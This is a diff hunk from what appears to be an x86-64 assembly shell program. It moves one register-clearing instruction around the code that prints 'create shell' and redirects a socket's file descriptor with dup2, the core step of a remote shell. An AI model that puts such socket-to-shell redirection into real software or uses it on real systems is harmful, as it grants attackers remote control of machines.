@@ -105,13 +105,13 @@ _start:
     mov rdx, conn_success_msg_len
     call write
 
-    mov rsi, 0
 
     mov rdi, 2
     mov rsi, create_shll_msg
     mov rdx, create_shll_msg_len
     call write
-
+    
+    mov rsi, 0
 .redirection:
     mov rdi, [sockfd]
     call dup2 ; duplication du fd
